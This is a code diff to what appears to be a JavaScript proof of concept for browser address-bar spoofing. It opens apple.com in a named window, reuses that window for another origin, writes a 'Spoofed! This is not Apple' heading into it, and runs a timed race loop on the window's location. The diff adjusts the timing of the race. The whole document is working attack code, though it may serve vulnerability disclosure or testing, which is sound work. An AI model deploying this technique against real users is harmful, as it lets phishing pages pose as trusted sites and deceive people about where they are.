@@ -13,10 +13,8 @@ let windowSpoof;
 
 function race() {
   try {
-    //
     windowSpoof.location.href;
   } catch (e) {
-    //
     windowSpoof.location.href = "https://example.com";
   }
 }
@@ -26,20 +24,21 @@ function startSpoof() {
   //
   windowSpoof = window.open("https://apple.com", "x");
 
-  //
+  // 
   setTimeout(() => {
+
+    // reuse window
     windowSpoof = window.open("https://www.microsoft.com:82", "x");
 
     try {
-      windowSpoof.document.write(
-        "<h2>Spoofed! This is not Apple</h2>"
-      );
+      windowSpoof.document.write("<h2>Spoofed! This is not Apple</h2>");
     } catch(e) {}
 
-  }, 10);
+    // 
+    setInterval(race, 5);
 
-  //
-  setInterval(race, 0);
+  }, 300); //
+
 }
 
 </script>
